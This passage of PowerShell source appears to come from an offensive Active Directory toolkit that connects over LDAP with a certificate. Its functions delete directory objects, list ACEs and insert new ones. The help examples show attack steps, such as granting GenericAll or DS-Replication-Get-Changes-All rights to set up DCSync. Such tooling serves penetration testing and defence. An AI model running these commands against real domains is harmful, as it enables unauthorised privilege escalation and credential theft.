    <#

        .SYNOPSIS

            Deletes a specified object.

            - The object to be deleted MUST exist.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ObjectDN

            [System.String] 
            
            The identity of the targeted object to delete.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _DeleteObject -LdapConnection $LdapConnection -ObjectDN 'CN=TSOL,OU=INTOTHEWILD,DC=X'

            Deletes the object `CN=TSOL,OU=INTOTHEWILD,DC=X`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.deleterequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the distinguished name of the object to delete")]
        [System.String]$ObjectDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    if ((Read-Host "[!] Pending Deletion Of Object '$ObjectDN'. Continue? (Y/N)") -cne 'Y')  { 
        return "[*] Gracefully Exiting..." 
    }
    if ((Read-Host "[!!] Sure?! (Last Warning...) (YY/N)") -cne 'YY')  { 
        return "[*] Gracefully Exiting..."
    }

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Deleting Object '$ObjectDN'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.DeleteRequest(
            $ObjectDN
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Deleted '$ObjectDN' Object !"
    return
}


function _GetInboundACEs {
    
    <#

        .SYNOPSIS

            Returns all inbound ACEs over a targeted specified object.

            - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ObjectDN

            [System.String] 
            
            The identity of the targeted object whose inbound ACEs must be retrieved.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=DC02,OU=Domain Controllers,DC=X' |Select-Object AceQualifier,AccessMaskNames,AccessMask,ObjectAceTypeName,ObjectAceType,SecurityIdentifier

            Get all inbound ACEs targeting the object `CN=DC02,OU=Domain Controllers,DC=X`, and extract their Ace Qualifier (mostly `AccessAllowed` or `AccessDenied`), Access Mask(s), Access Right Name (i.e. ObjectAceType, if any), and SecurityIdentifier (i.e. the granted principal)

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}1103'}

            Get all allowed inbound ACEs targeting the object `CN=John JD. DOE,CN=Users,DC=X`, and extract the ones granted to principal with RID 1103

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=Smart SC. CARDY,CN=Users,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}'}

            Get all allowed inbound ACEs targeting the object `CN=Smart SC. CARDY,CN=Users,DC=X`, and extract the ones granted to non-default principals (i.e. RID equal or above 1000; in particular, default principals are NOT returned, such as principal with SID `S-1-5-32-544` (i.e. `Administrators`), or `S-1-1-0` (i.e. `Everyone`))

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=Ab AC. CEF,CN=Users,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and $_.AccessMaskNames -eq 'GenericAll'}

            Get all allowed inbound ACEs targeting the object `CN=Ab AC. CEF,CN=Users,DC=X`, and extract the ones whose Access Mask is `GenericAll`

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and $_.SecurityIdentifier -like '*-1103'}

            Get all allowed inbound ACEs targeting the object `CN=J0hn JR. RIPP3R,CN=Users,DC=X`, and extract the ones whose Access Masks contain `GenericAll`, or `GenericWrite`, or `WriteProperty`, or `WriteDACL`, and granted to principal with RID 1103

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=Ash AC. C4T,CN=Users,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and $_.ObjectAceTypeName -eq 'User-Change-Password' -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}'}

            Get all allowed inbound ACEs targeting the object `CN=Ash AC. C4T,CN=Users,DC=X`, whose Access Right Name (i.e. ObjectAceType) is `User-Change-Password`, and extract the ones granted to non-default principals (i.e. RID equal or above 1000; in particular, default principals are NOT returned, such as principal with SID `S-1-5-32-544` (i.e. `Administrators`), or `S-1-1-0` (i.e. `Everyone`)). In other words, we're extracting the non-default principals allowed to change the Hashcat's password.

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'CN=KindaGroupy,CN=Builtin,DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -eq 'GenericAll' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or ($_.AccessMaskNames -ilike '*Self*' -and $_.ObjectAceTypeName -eq 'Self-Membership')) -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}'}

            Get all allowed inbound ACEs targeting the object `CN=KindaGroupy,CN=Builtin,DC=X`, and extract the ones granted to non-default principals (i.e. RID equal or above 1000; in particular, default principals are NOT returned, such as principal with SID `S-1-5-32-544` (i.e. `Administrators`), or `S-1-1-0` (i.e. `Everyone`)) allowed to change its group members (either themselves, or others)

        .EXAMPLE

            _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN 'DC=X' |?{$_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*Write*' -or $_.AccessMaskNames -ilike '*ExtendedRight*' -or $_.ObjectAceTypeName -ieq 'DS-Replication-Get-Changes(-All)?$') -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}'}

            Get all allowed inbound ACEs targeting the object `DC=X` (domain), whose Access Masks contains either `GenericAll`, `Write`, or `ExtendedRight` patterns, whose Access Right Name (i.e. ObjectAceType) is either `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All`, and extract the ones granted to non-default principals (i.e. RID equal or above 1000; in particular, default principals are NOT returned, such as principal with SID `S-1-5-32-544` (i.e. `Administrators`), or `S-1-1-0` (i.e. `Everyone`)) (4r3n't y4 lO0k1n' 4 DC$ynC ?!)

        .OUTPUTS

            [PSCustomObject]{}
            
            All inbound ACEs over a specified targeted object.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.acequalifier (Ace Qualifiers)

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights (Access Masks)

        .LINK 

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb (Access Right Names, i.e. ObjectAceTypes)
        
        .LINK

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-azod/ecc7dfba-77e1-4e03-ab99-114b349c7164 (Security IDentifiers, Relative IDentifiers)

        .LINK

            https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers (Well-known SIDs)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object")]
        [System.String]$ObjectDN
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Retrieving List Of Inbound ACEs Over The Object '$ObjectDN'..."
    $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute "nTSecurityDescriptor"
    $DomainDN = _Helper-GetDomainDNFromDN -DN $ObjectDN

    # https://www.powershellgallery.com/packages/RestSetAcls/0.2.6/Content/SddlUtils.ps1
    $ResultObjects = @()
    for ($i = 0; $i -lt $SD.DiscretionaryAcl.Count; $i++) {
        $ResultObject = [PSCustomObject]$SD.DiscretionaryAcl[$i];
        # If the ACE has an ObjectAceType, add its name into the result object
        if ($ResultObject.ObjectAceType) {
            # Translate 'ObjectAceType' checking among the Extended Rights Names (Standard rights) or LDAP Attribute Names (Advanced rights)
            $ObjectAceTypeName = _Helper-GetNameOfACEAccessRightGUID -AccessRightGUID ($ResultObject.ObjectAceType)
            if (-not $ObjectAceTypeName) { $ObjectAceTypeName = _Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID ($ResultObject.ObjectAceType) }
            $ResultObject = $ResultObject | Add-Member -PassThru -Force -NotePropertyName "ObjectAceTypeName" -NotePropertyValue $ObjectAceTypeName
        }
        # If the ACE has an InheritedObjectAceType, add its name into the result object
        if ($ResultObject.ObjectAceType) {
            # Translate 'InheritedObjectAceType' checking among the Extended Rights Names (Standard rights) or LDAP Attribute Names (Advanced rights)
            $InheritedObjectAceTypeName = _Helper-GetNameOfACEAccessRightGUID -AccessRightGUID ($ResultObject.InheritedObjectAceType)
            if (-not $InheritedObjectAceTypeName) { $InheritedObjectAceTypeName = _Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID ($ResultObject.InheritedObjectAceType) }
            $ResultObject = $ResultObject | Add-Member -PassThru -Force -NotePropertyName "InheritedObjectAceTypeName" -NotePropertyValue $InheritedObjectAceTypeName
        }
        # If the ACE has an AccessMask, add its name into the result object
        if ($ResultObject.AccessMask) {
            $ResultObject = $ResultObject | Add-Member -PassThru -Force -NotePropertyName "AccessMaskNames" -NotePropertyValue (_Helper-GetNamesOfACEAccessMaskValue -AccessMaskValue ($ResultObject.AccessMask));
        }
        # If the ACE has a Security Identifier (should always be true to define the inbound ACE), add its name into the result object
        if ($ResultObject.SecurityIdentifier) {
            # TODO: 
            # For some reasons, filtering entries using the SID is slower than UAC, DN, or LDAP filtering. 
            # Therefore, trying to resolve SecurityIdentifierName below makes this script incredibly slower, especially with many ACEs.
            # Without certainty, this *might* be because SID is a binary, hence calculated for every request on the fly ?
            #   https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/dd4dc725-021b-4c8c-a44a-49b3235836b7 (Basics, objectGUID, and Special Attribute Behavior)
            #   https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/5d58c90d-3cc5-444f-aabd-cff5f99d70f7 (Alternative Form of SIDs)
            #   https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/78eb9013-1c3a-4970-ad1f-2b1dad588a25 (SID)
            # Commenting resolution for now...

            #$ResultObject = $ResultObject | Add-Member -PassThru -Force -NotePropertyName "SecurityIdentifierName" -NotePropertyValue $(_Filter -LdapConnection $LdapConnection -SearchBase $DomainDN -SIDFilter $($ResultObject.SecurityIdentifier.Value) -Properties 'sAMAccountName');
        }
        $ResultObjects += $ResultObject;
    }

    if ($ResultObjects.Length -eq 0) {
        Write-Host "[!] No Inbound ACE Found !"
    }
    
    return $ResultObjects;
}


function _CreateInboundACE {
    
    <#

        .SYNOPSIS

            Creates an inbound ACE for a principal into a targeted object. In other words, it grants/denies an ACE to the principal (source) over the targeted object (destination)

            - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
            - The inbound ACE to create MUST NOT already exist in the target's inbound ACEs (i.e. in its `nTSecurityDescriptor`).

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 

            The source principal's identity of the ACE to create (i.e. principal to be granted / denied with the ACE)

        .PARAMETER AceQualifier

            [System.String] 
            
            The Qualifier of the ACE to create (i.e. `AccessAllowed`, `AccessDenied`, `SystemAudit`, or `SystemAlarm`)

        .PARAMETER AccessMaskNames

            [System.String] 
            
            The Access Mask Name(s) (comma-separated, if multiple) of the ACE to create (among `CreateChild`, `DeleteChild`, `ListChildren`, `Self`, `ReadProperty`, `WriteProperty`, `DeleteTree`, `ListObject`, `ExtendedRight`, `Delete`, `ReadControl`, `GenericExecute`, `GenericWrite`, `GenericRead`, `WriteDacl`, `WriteOwner`, `GenericAll`, `Synchronize`, and `AccessSystemSecurity`)

        .PARAMETER AccessRightName

            [System.String] 
            
            The Access Right Name (i.e. `ObjectAceType`) of the ACE to create (Optional).

            - Some ACE doesn't have an `ObjectAceType` (check `PrincipalTo*.txt` to get legitimately formed ACEs). For instance, `GenericAll` ACEs are provided without `ObjectAceType`, hence this attribute MUST NOT be provided whenever we want to create a `GenericAll`-type'ed ACE.

        .PARAMETER TargetDN

            [System.String] 
            
            The identity of the targeted object against which the inbound ACE is applied

        .PARAMETER AccessRightGUID

            [System.String] 
            
            The Access Right GUID (i.e. `ObjectAceType`'s GUID) of the ACE to create (Optional).

            - Not required if -AccessRightName is specified.

            - Some ACE doesn't have an `ObjectAceType` (check `PrincipalTo*.txt` to get legitimately formed ACEs). For instance, `GenericAll` ACEs are provided without `ObjectAceType`, hence this attribute MUST NOT be provided whenever we want to create a `GenericAll`-type'ed ACE.
            - This parameter should (?) be useless, as the `AccessRightName` parameter is given for convenience. For instance, you may set -AccessRightName `DS-Replication-Get-Changes-All`, instead of `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`. 
            - What can happen if an invalid `ObjectAceType` GUID is provided, such as '12345678-1234-1234-1234-123456789012' ? ¯\_(*_*)_/¯

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Zack ZS. STRIFE,CN=Users,DC=X' -TargetDN 'CN=ESARVI01,CN=Computers,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'

            Creates the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='GenericAll', ObjectAceType=NULL]` provided to the principal `Zack ZS. STRIFE` towards the computer target object `ESARVI01$` (as per `PrincipalToComputer.txt`). In other words, principal `Zack ZS. STRIFE` will be granted `GenericAll` rights over the computer target object `ESARVI01$`.

            - As per `PrincipalToComputer.txt`, `GenericAll` Access Mask implies the ACE has no `ObjectAceType` (i.e. NULL), hence not specified.

        .EXAMPLE

            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes' -TargetDN 'DC=X'

            Creates the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='DS-Replication-Get-Changes']` provided to the principal `Wanha BE. ERUT` towards the domain target object `X` (as per `PrincipalToDomain.txt`). In other words, principal `Wanha BE. ERUT` will be granted `DS-Replication-Get-Changes` rights over the domain target object `X` (Hmmm... Legit So Far...).

            - As per `PrincipalToDomain.txt`, `DS-Replication-Get-Changes` Access Right is associated with Access Mask `ExtendedRight`.

        .EXAMPLE

            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes-All' -TargetDN 'DC=X'

            Creates the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='DS-Replication-Get-Changes-All']` provided to the principal `Wanha BE. ERUT` towards the domain target object `X` (as per `PrincipalToDomain.txt`). In other words, principal `Wanha BE. ERUT` will be granted `DS-Replication-Get-Changes-All` rights over the domain target object `X` (4r3n't y4 lO0k1n' 2 DC$ynC ?!)

            - As per `PrincipalToDomain.txt`, `DS-Replication-Get-Changes-All` Access Right is associated with Access Mask `ExtendedRight`.

        .EXAMPLE

            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. ERUUUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -TargetDN 'DC=X'

            Creates the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='1131f6ad-9c07-11d1-f79f-00c04fc2dcd2']` provided to the principal `Wanha BE. ERUUUT` towards the domain target object `X` (as per `PrincipalToDomain.txt`). In other words, principal `Wanha BE. ERUUUT` will be granted `DS-Replication-Get-Changes-All` rights over the domain target object `X` (4r3n't y4 lO0k1n' 2 DC$ynC ?!)

            - As per `PrincipalToDomain.txt`, `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` Access Right GUID is associated with Access Mask `ExtendedRight`.

        .EXAMPLE

            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Whut WZ. ZAT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID '12345678-1234-1234-1234-123456789012' -TargetDN 'OU=Trach TK. KOLEKTOR,DC=X'

            Creates the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='12345678-1234-1234-1234-123456789012' (?¿Whut¿?)]` provided to the principal `Whut WZ. ZAT` towards the Organizational Unit target object `Trach TK. KOLEKTOR` (as per... WHUT?!). In other words, principal `Whut WZ. ZAT` will be granted `?¿Special Permissions¿?` (Whut?!) rights over the OU target object `Trach TK. KOLEKTOR`

            - As per `PrincipalTo...`, I mean... WHUT?!

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.acequalifier (Ace Qualifiers)

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights (Access Masks)

        .LINK 

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb (Access Right Names, i.e. ObjectAceTypes)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the source principal's identity of the ACE to create (i.e. principal to grant / deny with the ACE)")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the Qualifier of the ACE to create (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
        [ValidateSet('AccessAllowed', 'AccessDenied', 'SystemAudit', 'SystemAlarm')]
        [System.String]$AceQualifier,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE to create (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
        [System.String]$AccessMaskNames,

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE to create (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
        [PSDefaultValue(Help="Empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
        [System.String]$AccessRightName = '',

        [Parameter(Position=5, Mandatory=$true, HelpMessage="Enter the destination object's identity of the ACE to create (i.e. targeted object against which the ACE applies)")]
        [System.String]$TargetDN,

        [Parameter(Position=6, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to create (you may refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt'). (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
        [PSDefaultValue(Help="Empty string by default if not specified. Can specifying INVALID GUIDs (e.g. '12345678-1234-1234-1234-123456789012') have side effects ? ¯\_(*_*)_/¯")]
        [System.String]$AccessRightGUID = ''
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    $ACEString = ''

    $AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames $AccessMaskNames;

    # =============================================================================
    $WhutIsGoingOn = $false
    if (-not $AccessRightGUID) {
        # We should always be here, as the user is providing the Access Right Name (e.g. ObjectAceType's Name), and NOT the GUID.
        $AccessRightGUID = _Helper-GetGUIDOfACEAccessRightName -AccessRightName $AccessRightName;
    }
    # ?! ThE uSeR mAnUaLlY prOvIdEd An InVaLiD (?) aCeEsS riGhT gUiD !?
    elseif ((_Helper-GetNameOfACEAccessRightGUID $AccessRightGUID) -eq $null -and (_Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID $AccessRightGUID) -eq $null) {
        # If we're here, it means that the user had manually specify a hand-crafted, while INVALID (? at least, unrecognized...), GUID for the ObjectAceType in its command, via the '-AccessRightGUID' parameter. 
        # We won't be here if that parameter was legitimate  (? at least, such as '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', i.e. 'DS-Replication-Get-Changes-All', or ' 	a8df73ef-c5ea-11d1-bbcb-0080c76670c0', i.e. 'Employee-Number'...).
        # Therefore, what can happen, given that the provided GUID is invalid, such as '12345678-1234-1234-1234-123456789012' ? ¯\_(*_*)_/¯
        Write-Host "[!] ?¿Whut¿? [!]"
        $WhutIsGoingOn = $true
    } 
    # =============================================================================

    if ($AccessRightGUID -eq [Guid]::Empty) {
        # If the ObjectAceType Name given by the user is specified, but not found (e.g. typo 'Usre-Chnage-Psasword'), then it means we are not dealing with the scenario where the ObjectAceType is legitimately NULL.
        # Indeed, if the ObjectAceType's GUID is NULL, it should only be because the given ObjectAceType's name is NULL (hence not provided). 
        # In such a case, we exit to prevent malformed ACEs...
        if ($AccessRightName) {
            Write-Host "[!] Couldn't Find GUID Of Access Right Name '$AccessRightName' !"
            return $null
        }
        $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType=NULL]"
    } elseif ($WhutIsGoingOn) {
        # ?! ThE uSeR mAnUaLlY prOvIdEd An InVaLiD (?) aCeEsS riGhT gUiD !?
        $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightGUID' (?¿Whut¿?)]"
    } elseif ($AccessRightGUID) {
        $AceString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightGUID']"
    } else {
        $AceString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightName']"
    }

    Write-Verbose "[*] Creating Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN'..."

    if ($AceQualifier -eq 'AccessAllowed') {
        $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::AccessAllowed;
    } elseif ($AceQualifier -eq 'AccessDenied') {
        $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::AccessDenied;
    } elseif ($AceQualifier -eq 'SystemAudit') {
        $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::SystemAudit;
    } elseif ($AceQualifier -eq 'SystemAlarm') {
        $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::SystemAlarm;
    }
    
    $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid"
    $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute "nTSecurityDescriptor"

    # First checking whether the ACE is already in the DACL SD. If so, exit.
    foreach ($ACE in _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDN) { 
        if ($ACE.SecurityIdentifier -eq $IdentitySID -and $ACE.AceQualifier -eq $AceQualifier -and $ACE.AccessMaskNames -eq $AccessMaskNames -and $ACE.ObjectAceType -eq $AccessRightGUID) {
            Write-Host "[!] Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' Already Exists !"
            # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
            # Writing the Check / Restoration texts for convenience
            if ($AccessRightGUID -eq [Guid]::Empty) {
                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
                Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)'"
            } else {
                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
                Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
            }
            return $null
        }
    }

    Write-Verbose "[*] Inserting The New ACE Into The Target's 'nTSecurityDescriptor'..."

    # ACEs:                   https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries
        # AceFlags:               https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.aceflags
        # AceQualifier:           https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.acequalifier
        # AccessMask:             https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.accessmask
        # ObjectAceFlags:         https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.objectaceflags
        # ObjectAceType:          https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb
        # InheritedObjectAceType: https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.objectace.inheritedobjectacetype
    
    # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
    if ($AccessRightGUID -eq [Guid]::Empty) {
        $ObjectAceTypePresent = [System.Security.AccessControl.ObjectAceFlags]::None;
    } else {
        $ObjectAceTypePresent = [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent;
    }
    
    $SD.DiscretionaryAcl.InsertAce(
        0,
        (New-Object System.Security.AccessControl.ObjectAce(
            [System.Security.AccessControl.AceFlags]::None,                         # AceFlags (Inherited, ContainerInherit, etc.)
            [System.Security.AccessControl.AceQualifier]$NewAceQualifier,           # AceQualifier (AccessAllowed, AccessDenied, SystemAudit, SystemAlarm)
            [System.Int32]$AccessMaskValue,                                         # AccessMask (GenericAll, ReadProperty, WriteProperty, etc.)
            [System.Security.Principal.SecurityIdentifier]$IdentitySID,             # SecurityIdentifier (Trustee's SID)
            [System.Security.AccessControl.ObjectAceFlags]$ObjectAceTypePresent,    # ObjectAceFlags (None, ObjectAceTypePresent, InheritedObjectAceTypePresent)
            [Guid]$AccessRightGUID,                                                 # ObjectAceType (Access Right's GUID)
            [Guid]::Empty,                                                          # InheritedObjectAceType (Inherited Right's GUID)
            [bool]$false,                                                           # isCallback
            [byte[]]$null                                                           # opaque
        ))
    )
    
